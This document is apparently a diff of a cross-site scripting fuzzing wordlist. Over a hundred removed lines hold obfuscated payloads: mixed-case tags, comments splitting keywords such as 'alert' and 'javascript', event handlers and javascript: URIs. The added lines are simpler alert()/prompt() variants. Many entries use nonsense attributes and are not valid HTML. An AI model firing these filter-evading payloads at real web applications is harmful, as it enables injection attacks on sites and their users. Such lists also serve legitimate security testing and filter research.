-<svG onkeyuP='aLErt(1)' ONm/*xss*/ouSeoVEr='valuE' OnLY/*comment*/></svG>
-'>\"<bOdy POPover='jaVas/*comment*/c/**/rIpt:alerT(3)' onLOAD='alErt(3)' onloAD='alert(1)' data-teSt='T/*comment*/esT' />
-<boDy AutofoCus='JavasCRipt:alERt(3)' OnerRor/*comment*/='alerT(3)' oNerror='alErT(1)' dAta-iNfo='TEST' />
-/**/'>\"<ifR/*comment*/AMe onI/*comment*/nput='aLerT(1)' Src='vAlUe' autOfOcuS></IfrAMe>
-<form AU/**/toPlaY='JavasCRIpt:aLeRT(3)' oNtoGGLe='al/**/ert(3)' aCtion='alErt(1)' datA-cusTOm='teST' />
-'>\"<SCripT onf/*xss*/OcUs='a/*xss*/lerT(1)' SrC='vAlue' aUtopLAy></ScrIpT>
-<BoDy oNly='javaScriPT:alert(3)/*comment*/' ONkeYUp/*comment*/='aLErt(3)' onloAd='aL/*xss*/erT(1)' DAtA-cUsTom='TeSt' />
-'>\"<ViDeo AUTOFocuS OnSelect='alert(2)' oNPlAy='vaLue' /*xss*/Data-custoM='tEsT'></vIdEO>
-<VI/*xss*/deo onlY oNbLuR='ALErt(2)' src='VaLuE' data-teS/*xss*/t='tesT'></Video>
-'>/*comment*/\"<img AUtOplaY='jaVaScrIpT:alERT(3/*comment*/)' ONsUbmIT='alErt(3)' alT='alert(1)' DAtA-custOM='teSt' />
-<iframe onChaNGe='AlErt(1)' /*comment*/oNlOAd='valUe' pOPOver></iFrame>
-'>\"<iFRaMe onselecT='aleRt(1)' SrC/*comment*/='ValuE' popoveR></ifraMe>
-<SvG Onc/*comment*/lICK='AlerT(1)' stYle='value' autOPlay></SV/*xss*/G>
-'>\"<fOrm On='j/**/avaSCRiPt:alErt(3)' onmOuSeOVeR='alErT(3)' oNsUbmiT='aLeRt(1)' DaTA-custo/*xss*/m/**/='tEst' />
-<iMg onLY='jav/*comment*/aScrIpT:alErt(3)' OnerRoR='AlERT(3)' onErrOr/**/='AlErt(1)' daTa-TeSt='tesT' />
-'>\"<inPUT poPover='jaVaScrIPT:AleRT(3)' OnblUr='aLerT(3)' onc/*xss*/haNge='aLErT(1)' data-test='test' />
-<SCrIPt oninput='ALeRT(1)' type='vaLue' autopl/*xss*/aY></scRiPt>
-'>\"<BoDy OnlY='jaVascripT:alerT(3)' On/*xss*/keyDown='Alert(3)' oNerror='AlERt(1)' Data-InfO='TeSt' />
-<sCr/*xss*/ipT OnChangE='ALert(1)' src='vaLue' oN></SCript>
-'>\"<s/*comment*/CRIpT /**/ONInput='alErt(1)' typE='VAluE'/*comment*/ aUTOfocuS></Script>
-<BOdy POPoveR='javAscrIpT:aLERt(3)' ons/**/uBMit='AlerT(3)' onError='aleRT(1)' data-custoM='teSt' /**//*comment*//>
-'>\"<ifRame oNKeydOwN='AlerT(1)' onload='ValuE' pOpove/*comment*/r></IFrame>
-<sCrIpt onclIck='A/**/LErt(1)' typ/*comment*/e='VaLUe' aUtOfocUs></SCri/**/pt>
-'>\"<audIO onLY/**/ oncHaNge='aLert(2)' sRc='valUE' data-InFO/*xss*/='test'></auDio>
-<Inp/**/Ut ON='jaVaScrIpt:alerT(3)' OnSUBmiT='alerT(3)' onfOcus='ALErT(1)' datA-Info='tEst' />
-'>\"<SCrIpt onkeyuP='aLErt(1)' srC='valUe' auTO/*xss*/FocuS></script>
-<iframe onTogGlE='Ale/*xss*/rT(1)/*comment*/' onLoAd='valUe' POPoVEr></ifRAme>
-'>\"<aUDiO auTofoc/*comment*/Us ONMouSEovER='ALert(2)' aUtoplay='vaLuE' Data-tesT='test'></aUDiO>
-<inPut ONly='JaVAsCript:Alert(3)'/*comment*/ OnSElECT='alerT(3)' vAlue='aLERt(1)' daTa-inFo='/*xss*/tesT' />
-'>\"<ScrIpt ONsElEC/**/T='AlerT(1)' tYpE='ValUe' autoplay></script>
-<VIdEo autoplAY oN/*comment*/inPut='ALErT(2)' AutoplAy='Value' DAtA-test='tesT'></viDEO>
-'>\"<IfraMe Onfo/*xss*//*xss*/CUS='aLert(1)' OnloaD='vAluE' AuToFocus></IframE>
-<Input OnlY='jAvasC/*xss*/RiPt:AleRt(3)' onseleCT='alErT/*/**/comment*/(3)' vaLue='aleRt(1)' data-inFo='test' />
-'>\/*comment*/"<SvG oninp/*comment*/uT='ALerT(1)' onmo/**/uSeovEr='value' AutOPLay></SVg>
-/*xss*/<inpuT PopOVEr='jaVAscrIPt:aleRt(3)/**/' OntoGgLe='ALErt(3)' oNfOCus='alErt(1)' DAtA-info='test' /*xss*//>
-'>\"<FoRm aUTofoCus/*xss*/='jaVascriPt:a/*xs/**/s*/leRT(3)' onblUr='aLeRt(3)' AcTioN='ALErt(1)' DaTa-cuStoM='test' />
-<if/**/rame onCliCk='ALErt(1)'/*xss*/ Src='vaLUE' On></IFrAM/**/E>
-'>\"</**/iNput pOPOver='javAscriPt:Alert(3)' ONSubmIT='ALert(3)' oncHangE='AlerT(1)' data-cUstoM='TEst' />
-<svg oNkEyUp='AlErt(1)' OnmouseoveR='v/**/alue' auToPlAy></SV/*comment*/G>
-'>\"<Svg onmOUsEovEr='AlERT(1)' StylE='value' POpover/**/></sVg>
-<ifRaMe oncHaN/*comment*/ge='aleRT(1)' Onload='value' AUtoFoCuS></ifrAme>
-'/*xss*//**/>\"<script onInput='alert(1)' tYpE='VAlUe' POPOv/*xss*/Er></scripT>
-<sCRipT OncLicK='alER/*xss*/t(1)' src='Valu/*comment*/e' ONlY></sCript/*comment*/>
-'>\"<form/**/ PoPOver='javAscRiPt:aLert(3)' onPasTe='AleRt(3)/*comment*/' AcTiON='aleRt(1)' datA-inFo='test' />
-<body auTofocuS='javascriPT:/*comme/*comment*/nt*/alerT(3)' OntoGgle='alErt(3)' oNLoad='aLERt(1)' Data-xSs='TEsT' />
-'>\"<Form ONly=/**/'jAvAscriPt:aLERt(3)' onLOad='ALERt(3)' OnsuBmit='alERT(1)' data-info='tesT' />
-<ifRAMe/*xss*/ O/**/NlOad='AlErt(1)' /*xss*/sRc='vALue' AutoFOcuS></iframe>
-'>\"<ifrAMe onF/**/ocUS='aLErt(1)/*xss*/' SRc='vaLuE' Autoplay></iFraMe>
-<img A/*xss*/Utofocus='JavascrIpT:AleRT(3)' onKEydoWn='alert(3)' sRC='alERT(1)' daTa-xSs='TEst' />
-'>\"<img only='jaVascRipt:alErt(3)' ONpaStE='aLert(3)' alt='AleRT(/**/1)' d/*comment*/ata-iNFO='Test' //**/>
-<iMg ONLy='JaVascripT:aLErt(3)' oNTO/*comment*/GGle='aLeRT(3)' oneRroR='aLert(1)' daTA-Custom='test' />
-'>\"</**/iframe oNInPUt='alERt(1)' onLoad='value' oN/*comment*/></ifrAMe>
-<Script O/*comment*/nlOAD='aleRt(/*comment*/1)' tYP/**/e='ValUe' only></scRipt>
-'>\"<iMg poPoveR='JavAsCRipt:ALert(3)' oNseleCT='Alert(3)' srC='aLErT(1)' dATa-inf/*xss*//*comment*/o='t/**/ESt' />
-<sCRipt onfoCUs='Al/**/eRt(1)' src='/*comment*/VALuE' a/**/UtoplAy></sCripT>
-'>\"<I/*xss*/npuT PoPoVer='JavAscript:AlERt(3)' OnBLur=/*comment*/'AlErt(3)' Onchange='AlerT(1)' datA-CusTOM='Test' />
-<input on='jAvasCRiPt:alert(3)' OnLoAD='AlErT(3)' oNChanGE='AlErt(1)' dAta-tesT='t/**/est' />
-'>\"<img onLy='JaVaSCrIpT:aLert(3)' oNinput='AlerT(3)' src='aleRT(1)' daT/*xss*/a-TeSt='tEst' />
-<img oNlY='javascriPt:aLeRT(3)' oNInp/*comment*/Ut='ALerT(3)' oNerror='ALert(1)' data-xSS='tEsT' />
-'>\"<img only='JAVaSCrIpt:alerT(3)' oniNput='alerT(3)' /*comment*/sRC='aLerT(1)' da/*xss*/TA-inFO='teSt' />
-<bodY aUtoplay='javAscriPT/**/:ALErt(3)' onInPut='aleRt(3)' onloAd='aLert(1)' data-xss='teST' /*xss*//>
-'>\"<iFrAmE onsUbMIt='AL/*xss*/eRT(1)' onlOad='value' autoPlAy/**/></ifrAme>
-<VIDeo aUt/*xss*/ofocus Oninput='aLeRT(2)' oNplay='valuE' dATA-tEst='TEst'></vIdeo>
-'>\"<FOrm On='JavAScript:aLerT(3)' oneRROR='AleRT(3)' /*comment*/onsuBmit='alERt(1)' DatA-Xss='tEst' />
-/*xss*/</**/Audio /*comment*/autoplAY OnpaSte='alErT(2)' auTopLAy='valuE' DaTA-CustoM='teSt'></aUDIo>
-'>\"<sVg oNcHAnge='ALerT(1)' ONmouseO/*xss*/V/*xss*/er='/*comment*/valUe' popoVeR></sVg>
-<svG on//*xss*/**/past/**/e='alErT(1)' OnmouSEovEr='VALUe' AUtofOcuS></sVg>
-'>\"<BodY oNL/*comment*/y='javaScRiPt:alert(3)' on/**/FocUs='aLeRt(3)' onLOAD='aLErT(1)' Data-TeSt=/*comment*/'test' />
-<SvG onkEyUp='alert(1)' StyLe='vAlUe/**/' AUtofocuS></svG>
-'>\"<BodY a/*comment*/utofoCus='javascripT:AleRt(3)' onlOAD='alErt(3)' oNLOaD='alERt(1)' dAtA-XsS='TESt' />
-<FORm only='/*xss*/jaVAsCript:aLeRt(3)' oNiNpUt='AlerT(3)' oNSubmit='aLeRt(1)' daTA-CUStom=/**/'t/**/est' />
-'>\"<fOrm AuTofocuS='javAscrIPt:alERt(3)' /*xss*/onCHANGE='alErt(3)' acTion='AlErT(1)' DATa-custom='teSt' />
-<body aU/*xss*/toplay='jaVA/*comment*/script:ALerT(3)' OntogGle='alert(3)'/**/ OnLoad='AlErT(1)' DAta-TeSt='tEST' />
-'>\"<img autoplay='jAVAScRipt:aLert(3)' On/*comment*/C/**/LICK='aLerT(3)' /*xss*/onerrOr='aLert(1)' DAtA-info='test' />
-<S/*xss*/criPt On/*comment*/cHaNGe='alERt(1)' type='vALue' On></scrip/*xss*/t>
-'>\"<ifR/**/aMe onKEYup='al/**/ert(1)' onLoaD='Value' autofocUs></ifRaMe>
-<iFrame ONmOUseOver='alErt(1)' s/*xss*/rc='valUE' autOfocUs></i//**/**/fRAMe>
-'>\"<aUDIo OnLy ontO/*comment*/GGle='AleRt(2)' src='vAlue'/**//*xss*/ DAta-teSt='test'></auDio>
-<form on='javAscRIp/*xss*/T:alERt(3)' oNbluR/*comment*/='alErt(3)' onSubmiT='AlErT(1)' dat/*comment*/A-CUstOM='tEST' />
-'>\"<boDy popo/**/vER='javascR/*comment*/Ipt:aLer/*xss*/t(3)' oNseleCT='alert(3)' onlOad='ALert(1)' DatA-infO='tESt' />
-<svg oNCHangE='aler/**/T(1)' StYLE='value' auTofocus></S/*xss*/Vg>
-'>\"<iNPut Only='jaVaScRipT:alErt(3)' onFocUs='alErt(3)' oNchanGe='AlErt(1)' /**/daTa-iNfo='tEst' />
-<VideO aUtoP/*co/*xss*/mment*/lAY oNinpUt='a/*xss*/lert(2)' srC='ValuE' daTA-teSt='tesT'></VIdeO>
-'>\"<body Only='jAVaSCrIpt:AleRT(3)' oNmouseovER='AlErt(3)' OnlOaD='aleRt(1)' Data-cUsto/**/m='tesT' //*comment*/>
-<IfrAme /*xss*/onMOuseover='ALeRT(1)' src='vALUe' oN></*xss*//**//iframE>
-'>\"<ViDeo AUtoFocus OnkEy/**/UP='Alert(2)/**/' onplay='vaLue' data-Tes/*comment*/t='tESt'></ViDEo>
-<boDY onlY='jAVasCripT:aLert(3)' OnfoCUS='alert(3)' onload='ALert(1)' DATa-CU/*comment*/sTom='test' />
-'>\"<SVg On/*xss*/*xss*//CLIcK='aLert(1)' onload='Value' on></sv/*comment*/G>
-<svg ONlOaD='aLERT(1)' styLE='VAlu/**//*comment*//*xss*/e' autofoCUs></svg>
-'>\"<img only='JAvAscripT:alert(/**/3)' onCLiCk='aLerT(3)' AlT='aleRt(1)' DatA-INfO='test' />
-<Body/**/ oN='jAvAScript:aLERt(3)' oNfocuS='Alert(3)' /*comment*/oNError='aLerT(1)' Data-CustOm='teST' />
-'>\"<Form on='javAscriPt/**/:AlErT(3)' OnclICk='ALert(3)/*comment*/' ONsuBmit='Alert(1)' DATa-test='teST' />
-<svg oNCHanGe='ALERt(1)' /*comment*/onmouSeover='Va/*xss*/lue' ON></svg>
-'/*xss*/>\"<svG oN/**/kEydown='Alert(1)' stYle='vALUE' auTOplaY><//**/svg>
-<Body Popover='javaSCriPt:ALert(3)' ONLOaD='/**/alert(3)' onErROr='Alert(1)' daTa-XsS='tEs/**/T' />
-'>\"<FOrM /*comment*/ON='jaVAscriPT:a/*comment*/leRT(3)' oNfo/*xss*/Cus='aLeRt(3)' Onsubmit='Alert(1)' Data-infO='teSt' />
-<body AUtOfoCUS='JavAscRIpt:Alert(3)' onpAst/**/E='alerT(3)' OnERrOr='alert(1)' data-tEst='test' />
-'>\"<inPut aUtOfoCUs='javAscRIpt:Alert(3)' OnInPuT='AleRt(3)' valUe='aLerT(1)' data-c/*xss*/us/**/t/*comment*/oM='TesT' />
-<ifRamE o/**/NiNput='AleRT(1)' src='valUE' autOFocuS></IFrame>
-'>\"<iNPUt auToplay='J/**/av/*xss*/AsCrIpt:alert(3)' OnKEyup='aLeRT(/*xss*/3)' Onchange='aLErt(1)' datA-tEst='TeSt' />
-<iNPuT oN/*xss*/='jaVascRip/**/t:alErt(3)' OnkEydOwn='AlErt(3)' vAluE='aLert(1)' DatA-CustOm='teSt/**/' />
-'>\"<video aUtoplaY oNbLuR='AL/*xss*/ert(2)' src='valuE' data-xsS='TeSt'></*xss*//vIdeO>
-<aUDio ONlY ONfocUs='alerT(2)'/*xss*/ autoplay='ValuE' daTa-/*xss*/CUSTom='test'></AudIO>
-'>\"<VidEo POpOveR onsele/**/cT='aLErt(2)' SrC='value' daTA-xss='teST'></vIdeo>
-<vidEO pop/*xss*/oVer onmOuSeovEr='AleRT(2)' onpLAy='ValuE' DatA-inf/*xss*/o='tEst'></vIdEO>
-'>\"<If/*comment*/*xss*//rame onError='aLeRt(1)' OnLoad='vaLUE' auTopLay><//*comment*/iframe>
-<viDeO AutoFocUs onblUr='Alert(2)' srC='Value' dAtA-/*comment*/TESt='TEsT'></vIdeo>
-'>\"<iMG AutOfocUs='jaVAscript:ale/*xss*/rT(3)' oNkeYDown/**/='aleRt(3)' OnerRoR='AlErT(1/**/)' data-tesT='tESt' />
-<iFrame OntoggLe='alert(1)' onloaD='vALue/**/' AUtOFOcus><//*comment*/IfRame>
-'>\"<Img AUto/*comment*/plAy='JAVascripT:aleRt(3)' oNload='/*xss*/aLerT(3)' alt='alerT(1)' datA-XSS='tEST'/**/ />
-<Body pOPover='javasCrIPt/*xss*/:aLeRt(3)' onkEYup='alerT(3)' onlOAd='alert(1)' DaTA-Custom='tEs/*xss*/t' />
-'>\"<video ONly ontoggLE='AlErt(2)' AutopLay='valUE' daTa-Xss='tEst'></v/*comment*/idE/*xss*/O>
-<Img PopovEr='JavAsCRipt:ALert(3)/*comment*/' oNtoggle='alErt(3)' sRc='alerT(1)' DAta-TESt='teST' />
-'>\"<bOdY poPover='JAva/*comment*/scRipT:alERt(3)' OnKEYdoWn='AlErt(3)' onlOAD='alert(1)' DAta-CusToM='test' />
-<I/*xss*/Frame onmOuseOver='aLERt(1)' sRC='VALUE' only></IFrame>
-'>\"<svg on/*comment*//**/SELeCt='alERt(1)' onloAD='V/*xss*/alue' aUtoPlay></svg>
-<ifrAmE oNselect='alerT(1/*comment*/)' OnlOad='VaLuE' pOpovEr></IFRAme>
-'>\"<audio aUToplay oNFoCUs='aler/*xss*/t(2)' OnPLAy='val/*comment*/ue' datA-CustoM='tEST'></aUdIo>
-<Form popOver='JaVA/**/scRipt:ALerT(3)' onLoad='alErt(3)' acTion='alErT(1)' DatA-cUstoM='tEst' />
-'>\"<audio only OnB/**/lur='aLerT(2)' ONplAY='valuE' data-iNFO='TeST/*xss*/'></au/*comment*/Dio>
-<iMG pop/**/oVeR='/*comment*/JaVascrIPt:alert(3/*comment*/)' OneRRor='ALert(3)' src='AlerT(1)' dAta-xSs='tEst' />
-'>\"</*comment*/FoRM AutofoCus='JaVasCript:alert(3)' onclicK='aleRT(3)'/**/ aCtioN='alert(1)' dATa-tEST='tEsT' />
-<iFrAMe ONERror='/**/alert(1)' srC='valU/**/e' aUtOplay></IFrame>
-'>\"<ViDeo ON oNtoGgLE='alerT(2)' auToPlay/*comment*/='ValU/*comment*/e' daTA-test='test'></viDeo>
-<Body /**/PoPovEr='JavAsCript:AleRt(3)' OnpastE='AleRt(3)' Onl/*comment*//*xss*/oAd='alerT(1)' dAta-cusTOm='tesT' />
-'>\"<bOdy oNLy='jaVascRipt:ALeRT(3)' oNkeYdoWn='Alert(3/**/)' oNlOaD='alErt(1/*xss*//*xss*/)' Data-cuStom='test' />
-<bOdy on='javAScripT:alerT(3)' onmouseOveR='ALErt(3)' onerRoR='a/*comment*/lert(1)' DaTa-info='TESt' />
-'>\"<fORM onLY='javAscRIpT:AlErt(3)' Onc/*xss*/hange='aLeRT(3)' ONsUBmit='ALeRT(1)' dAta-custoM='test' />
-<Svg OnclICk='alERt(1)/**/' stylE='vaLue' AUtofocUs></SvG>
-'>\"<I/*xss*/f/*comment*/rAME onerror='aLeRt(1)' sRC='value' auToplAy></Iframe>
-<A/*comment*/uDio AUtoFocUs oNMoUsEover='alert(2)' srC='VaLue' DatA-CUStom='test'/*xss*/></AUdio>
-'>\"<AUDIo onlY onsElect='alerT(2)' sr/*co/**/mment*/C='vAluE' data-INFo='tesT'></auDiO>
-<scRiPt onload='alERt(1)' src/**/='vAlu/**/e' On></SCRiPT>
-'>\"<IMg Autofocus='J/*comment*/avaSCript:alert(3)' oNlOAd='ALeRt(3)' onERroR='/*xss*/AlErT(1)' DAtA-xsS='tESt' />
-<img ON='javaScr/*comment*/ipt:AlERt(3)' OnChange='AlErt(3)' oneRror='AlerT(1)' daTA-XSS='tEst' />
-'>\"<inPuT aUtOfocus='JAvasCrIpt:aLERt(3)' onPAstE='aleRt(3)' ONfOcUS='AlerT(1)' dA/*comment*/ta-xSs='test' />
-<FOrm on='JAVascrIPT:aLert(3)' Onb/**/LUR='alert(3)' onsub/**/mit='AlERt(1)' dA/**/tA-TesT='test' />
-'>\"<vIDeo oNly onCLiCK=/**/'aLeRt(2)' SrC='ValuE' dAt/**/a-CuStoM='tEst'></viDEo>
-<Svg onfocus='Al/**/Ert(1)' oNloAd='VAlUE' a/*x/*xss*/ss*/UTOpLay></svg>
-'>\"<inpUt on='javAscrIPT:AleRt(3)' onkeydOwN='/*comment*/alerT(3)' on/*comment*/change='aLert(1)' dAta-xsS='/**/tesT' />
-<inpuT AuToplay='JavaScript:AlerT/**/(3)' onload='ALert(3)' onfOCuS='alert(1)' data-TeSt='test' />
-'>/*comment*/\"<imG poPoVer='JAVAscRipt:AlerT(3)' o/*xss*/NcHAngE='AlErT(3)' oNerror='aleRt(1)' data-info='TEst' />
-<vIdeo pOp/*xss*/ovER onfocus='alErt(2)' onplay='vaLUE'/**/ daTa-infO='teSt'></ViDeO>
-'>\/*xss*/"<ScrIpT ONload='AleRT(1)' tYpe/*comment*/='value' auTofocuS></ScRIpt>
-<ViDEo autoplay OnpAste='alERT(2)' s/*comment*/rc='VaLuE' daTa-cUstom='teST'></vIDEo>
-'>\"<ScripT onmousEoVeR='alerT(1)' TypE='vA/*xss*/lue' popoVer></scrIpT>
-<S/*comme/**/nt*/vg onsUbmIt='alErt(1)' oNloAD='ValUe' pOpoVer></svG>
-'>\"<FOrm pOPOver=/*xss*/'jAvAScrIpT:Al/*xss*/ert(3)' ONbLUr='aleRT(3)/**/' actioN='aLert(1)' data-CustoM='Test' />
-<if/*xss*/raME oninput='/*comment*/AlErt(1)' Src='vALUe'/**/ ON></ifrAme>
-'>\"<iMg popoVer='Jav/*comment*/asCRIpt:alErt(3)' oNInpuT='aleRt(3)' src='aleR/**/T(1)' datA-tesT='Test' />
-<iNPut POPover='jAVasC/*comment*/rIpt:alErt(3)' oNmoU/*xss*/SEoVer='aleRt(3)' vaLue='AleRt(1)' dAtA-info='Test' />
-/*comment*/'>\"</*comment*/bOdy onlY='JavAsCript:aLErt(3)' oNSEleCT='alErt(3)' onERrOr='alErt(1)' DATa-xss='tEsT' />
-<IfrAm/*comment*/e onblur='aleRt(1)' SrC='valUe' auTofOCUs></IfraMe>
-'>\"<sCrIPt ONloaD='/*xss*/alerT(1)' TypE='ValuE/*xss*/' popover></SCRI/*xss*/pt>
-/*xss*/<img popoVer='javAscrIpt:AlErT(3)' OnPA/**/ste='AlErT(3)' onERrOr='Alert(1)' /*comment*/dATa-test='test' />
-'>\"<IFramE oNErrOr='aLert(1)' oNLoaD='value/*xss*/' auto/*xss*/fOCus></Ifram/*comment*/E>
-<Form aUtofocUs='JavaScripT:aL/*comment*/Ert(3)' onFocuS='aLErT(3)' OnsuBMIT='aleRt(1)' DatA-custom=/**/'test' />
-'>\"<boDY AUtofocu/**/s='JavASCrIPt:aleRt(3)' ONload='aLErt(3)' onloaD/*xss*/='alerT(/**/1)' dAtA-TeSt='tesT' />
-<iframE ONl/*comment*/oAD='alert(1)' oNloaD='vaLUe' Aut/**/OpLAy></IfRAMe>
-'>\"<FOrM autoFocUS='JavAScript:ALert/**/(3)' oNbLur='ALERT(3)' Onsubmit='alert(1)' Data-TEst='test' />
-<sCriPt OneRroR='al/**/erT(1)' srC='value' ON></sCriPt>
-'>\"<aUdIo on onBL/*/*comment*/xss*/ur='AleRT(2)' Src='valUe' dAta-info='tEst'></Audio>
-<vIdEo auTofoCus oNsUbMit='aLe/*comment*/rt(2)' onPLay='vAluE' dATa-xSs=/*comment*/'Test'></viDeo>
-'>\"<audiO pOpOVeR oNkeYUp='alErt(2)' SrC='vaLUE' Data-TeST='Test'></auDi/*comment*/o>
-<sc/*comment*/ript onsubMIt='aLert/*comment*/(1)' src='VaLuE' oN></scri/*xss*/PT>
-'>\"<body autoplAY='jaVaSCrIpt:aL/*comment*/ert(3)' ONpaste='aLerT(3)' oNERroR='aleRt(1)' DaTa-cuStOm='test' />
-<svg OneRRoR='aLert(1)' OnLO/*x/**/ss*/ad='vAlUE'/*comment*/ Only></svG>
-'>\"<IfRame onkeyUp='aLeRT(1)' O/*comment*/Nload/*comment*/='Value' autofoCUs></iFraMe>
-<imG OnLy='jAvaScript:aLErT(3)' onload='aler/*xss*/T(3)' oNERror/**/='aLErt(1)' daTa-iNfo='test' />
-'>/*comment*/\"<ScripT onm/**/ouseoVeR='AlERt(1)' tYPe='vaLue' onLy></scrIpT/*xss*/>
-<Sc/**/RIpT onkeYUp='aLert(1)' sRc='ValUe'/*xss*/ Pop/*xss*/over></script>
-'>\"<audIo O/**/NLy OnChAnge='aleRT(2)' onplAY='vAlUe' Data-CuStom='TEst'></audio>
-<Ifr/*xss*/amE oNload='Alert(1)' srC='vALuE' O/**/n></iFraME>
-'>\"/**/<Img /*comment*/oN='javasC/*xss*/ript:aLerT(3)' OnTogGlE='alert(3)' OneRror='alERt(1)' daTa-Xss='teSt' />
+<form On='javascript:alert(3)' Onerror='alert(3)' Onsubmit='alert(1)' Data-custom='prompt(1)' />
+<body Autoplay='javascript:alert(3)' Onerror='alert(3)' Onload='alert(1)' Data-xss='prompt(1)' />
+<form Autofocus='javascript:alert(3)' Onkeydown='alert(3)' Action='alert(1)' Data-info='prompt(1)' />
+<video Only='//google.com' Onpaste='alert(2)' Onplay='alert(1)' Data-custom='test'>alert(1)</video>
+<input Autoplay='javascript:alert(3)' Oninput='alert(3)' Onfocus='alert(1)' Data-custom='prompt(1)' />
+<input Autoplay='javascript:alert(3)' Onblur='alert(3)' Onchange='alert(1)' Data-xss='prompt(1)' />
+<video Popover='//google.com' Onchange='alert(2)' Src='alert(1)' Data-test='test'>alert(1)</video>
+<form Only='javascript:alert(3)' Onchange='alert(3)' Onsubmit='alert(1)' Data-xss='prompt(1)' />
+<video Autofocus='//google.com' Onpaste='alert(2)' Autoplay='alert(1)' Data-test='test'>alert(1)</video>
+<script Onselect='alert(1)' Type='alert(1)' Only>alert()</script>
+<video Autofocus='//google.com' Onkeyup='alert(2)' Src='alert(1)' Data-xss='test'>alert(1)</video>
+<input Href='javascript:alert(3)' Ontoggle='alert(3)' Onfocus='alert(1)' Data-test='prompt(1)' />
+<svg Onkeyup='alert(1)' Onmouseover='alert(1)' Href>alert()</svg>
+<input Only='javascript:alert(3)' Onchange='alert(3)' Value='alert(1)' Data-xss='prompt(1)' />
+<svg Onfocus='alert(1)' Onmouseover='alert(1)' Autofocus>alert()</svg>
+<body Only='javascript:alert(3)' Onerror='alert(3)' Onload='alert(1)' Data-xss='prompt(1)' />
+<svg Onkeyup='alert(1)' Onload='alert(1)' Autoplay>alert()</svg>
+<video Autoplay='//google.com' Onmouseover='alert(2)' Src='alert(1)' Data-custom='test'>alert(1)</video>
+<video Only='//google.com' Onmouseover='alert(2)' Autoplay='alert(1)' Data-test='test'>alert(1)</video>
+<iframe Onsubmit='alert(1)' Onload='alert(1)' Autoplay>alert()</iframe>
+<img On='javascript:alert(3)' Ontoggle='alert(3)' Onerror='alert(1)' Data-test='prompt(1)' />
+<audio Only='//google.com' Onerror='alert(2)' Autoplay='alert(1)' Data-xss='test'>alert(1)</audio>
+<video Only='//google.com' Onkeydown='alert(2)' Src='alert(1)' Data-custom='test'>alert(1)</video>
+<input Autoplay='javascript:alert(3)' Onselect='alert(3)' Onfocus='alert(1)' Data-custom='prompt(1)' />
+<script Onpaste='alert(1)' Src='alert(1)' Only>alert()</script>
+<input Autoplay='javascript:alert(3)' Ontoggle='alert(3)' Value='alert(1)' Data-custom='prompt(1)' />
+<svg Ontoggle='alert(1)' Onmouseover='alert(1)' Autofocus>alert()</svg>
+<audio Autofocus='//google.com' Onchange='alert(2)' Autoplay='alert(1)' Data-info='test'>alert(1)</audio>
+<audio Only='//google.com' Onselect='alert(2)' Onplay='alert(1)' Data-test='test'>alert(1)</audio>
+<iframe Onsubmit='alert(1)' Src='alert(1)' Href>alert()</iframe>
+<img Only='javascript:alert(3)' Onload='alert(3)' Onerror='alert(1)' Data-info='prompt(1)' />
+<video Href='//google.com' Onload='alert(2)' Autoplay='alert(1)' Data-xss='test'>alert(1)</video>
+<body On='javascript:alert(3)' Onsubmit='alert(3)' Onerror='alert(1)' Data-info='prompt(1)' />
+<iframe Onpaste='alert(1)' Src='alert(1)' Autofocus>alert()</iframe>
+<video Popover='//google.com' Oninput='alert(2)' Src='alert(1)' Data-xss='test'>alert(1)</video>
+<form On='javascript:alert(3)' Onkeydown='alert(3)' Action='alert(1)' Data-test='prompt(1)' />
+<body On='javascript:alert(3)' Onsubmit='alert(3)' Onload='alert(1)' Data-info='prompt(1)' />
+<body Autofocus='javascript:alert(3)' Onkeydown='alert(3)' Onload='alert(1)' Data-test='prompt(1)' />
+<iframe Onfocus='alert(1)' Src='alert(1)' Autoplay>alert()</iframe>
+<input Popover='javascript:alert(3)' Onchange='alert(3)' Onchange='alert(1)' Data-info='prompt(1)' />
+<iframe Onsubmit='alert(1)' Onload='alert(1)' Only>alert()</iframe>
+<input Popover='javascript:alert(3)' Onfocus='alert(3)' Onchange='alert(1)' Data-test='prompt(1)' />
+<script Oninput='alert(1)' Type='alert(1)' Autofocus>alert()</script>
+<video On='//google.com' Onpaste='alert(2)' Onplay='alert(1)' Data-test='test'>alert(1)</video>
+<iframe Onmouseover='alert(1)' Src='alert(1)' Autofocus>alert()</iframe>
+<script Onload='alert(1)' Src='alert(1)' Href>alert()</script>
+<video Popover='//google.com' Ontoggle='alert(2)' Autoplay='alert(1)' Data-xss='test'>alert(1)</video>
+<audio Autoplay='//google.com' Onerror='alert(2)' Onplay='alert(1)' Data-custom='test'>alert(1)</audio>
+<input On='javascript:alert(3)' Oninput='alert(3)' Onchange='alert(1)' Data-test='prompt(1)' />
+<body On='javascript:alert(3)' Onclick='alert(3)' Onerror='alert(1)' Data-info='prompt(1)' />
+<input Only='javascript:alert(3)' Onclick='alert(3)' Value='alert(1)' Data-xss='prompt(1)' />
+<iframe Onerror='alert(1)' Src='alert(1)' Only>alert()</iframe>
+<input Only='javascript:alert(3)' Ontoggle='alert(3)' Onchange='alert(1)' Data-custom='prompt(1)' />
+<body Href='javascript:alert(3)' Onsubmit='alert(3)' Onload='alert(1)' Data-xss='prompt(1)' />
+<svg Onblur='alert(1)' Onload='alert(1)' Href>alert()</svg>
+<script Ontoggle='alert(1)' Src='alert(1)' Href>alert()</script>
+<body Popover='javascript:alert(3)' Onkeydown='alert(3)' Onload='alert(1)' Data-custom='prompt(1)' />
+<audio Autoplay='//google.com' Onkeydown='alert(2)' Src='alert(1)' Data-test='test'>alert(1)</audio>
+<img On='javascript:alert(3)' Onselect='alert(3)' Alt='alert(1)' Data-custom='prompt(1)' />
+<input Popover='javascript:alert(3)' Onchange='alert(3)' Onfocus='alert(1)' Data-custom='prompt(1)' />
+<audio Popover='//google.com' Ontoggle='alert(2)' Onplay='alert(1)' Data-info='test'>alert(1)</audio>
+<svg Onload='alert(1)' Style='alert(1)' Popover>alert()</svg>
+<input Popover='javascript:alert(3)' Onsubmit='alert(3)' Value='alert(1)' Data-custom='prompt(1)' />
+<iframe Onload='alert(1)' Onload='alert(1)' Only>alert()</iframe>
+<body Href='javascript:alert(3)' Onpaste='alert(3)' Onerror='alert(1)' Data-xss='prompt(1)' />
+<video Href='//google.com' Onchange='alert(2)' Src='alert(1)' Data-test='test'>alert(1)</video>
+<iframe Onselect='alert(1)' Onload='alert(1)' Href>alert()</iframe>
+<form Href='javascript:alert(3)' Onchange='alert(3)' Action='alert(1)' Data-xss='prompt(1)' />
+<iframe Onerror='alert(1)' Src='alert(1)' Autofocus>alert()</iframe>
